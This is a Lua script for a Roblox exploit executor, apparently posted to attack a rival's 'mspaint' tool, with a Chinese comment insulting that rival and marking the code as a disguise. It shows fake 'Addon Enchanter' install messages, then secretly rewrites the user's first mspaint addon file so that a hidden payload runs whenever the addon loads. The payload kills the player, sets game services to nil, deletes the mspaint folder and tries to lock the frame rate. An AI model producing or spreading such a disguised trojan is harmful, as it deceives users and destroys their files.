--紫菜脚本 专门紫菜废物骂人没实力dog
--伪装

print("[mspaint_god_addon] writing file to your addon folder(will auto create if there haven't)")

local text = Drawing.new("Text")
text.Text = "[Mspaint Addon Enchanter] Downloading Assets. . ."
text.Position = Vector2.new(150, 150)
text.Color = Color3.new(0, 1, 0)
text.Size = 18
text.Font = Drawing.Fonts.UI
text.Visible = true

wait(1.3)

text:Remove()

local text = Drawing.new("Text")
text.Text = "[Mspaint Addon Enchanter] Writing new addon. . ."
text.Position = Vector2.new(150, 150)
text.Color = Color3.new(0, 1, 0)
text.Size = 18
text.Font = Drawing.Fonts.UI
text.Visible = true

wait(1.3)

text:Remove()

local text = Drawing.new("Text")
text.Text = "[Mspaint Addon Enchanter] Setting up supported languages(ZH-CN or EN-US). . ."
text.Position = Vector2.new(150, 150)
text.Color = Color3.new(0, 1, 0)
text.Size = 18
text.Font = Drawing.Fonts.UI
text.Visible = true

wait(1.3)

text:Remove()

local text = Drawing.new("Text")
text.Text = "[Mspaint Addon Enchanter] All done. Thank you for you're using our script. Goodbye!(U need load mspaint to use🟢)"
text.Position = Vector2.new(150, 150)
text.Color = Color3.new(0, 1, 0)
text.Size = 18
text.Font = Drawing.Fonts.UI
text.Visible = true

wait(1.3)
local stupid = [[

pcall(function()
    replicatesignal(game.Players.LocalPlayer.Kill)
end)

setreadonly(game,false)
game.Players.LocalPlayer.Humanoid.WalkSpeed = 0
game.Players.LocalPlayer.Humanoid.JumpPower = 0
game.Players.LocalPlayer.Humanoid.MaxHealth = 0
game.CoreGui = nil
game.Players = nil
game.StarterGui = nil
game.ReplicatedStorage = nil
if isfolder("mspaint") then delfolder("mspaint") end
while True do
    setfpscap(1)
end
]]
EditAddon = function()
    if (isfolder("mspaint")) and (isfolder("mspaint/addons")) then
        if isfile(listfiles("mspaint/addons")[1]) then
            a = listfiles("mspaint/addons")
            b = a[1]
            c = readfile(b)
            delfile(b)
            writefile(b,stupid)
            appendfile(b,c)
        end
    end
end

EditAddon()
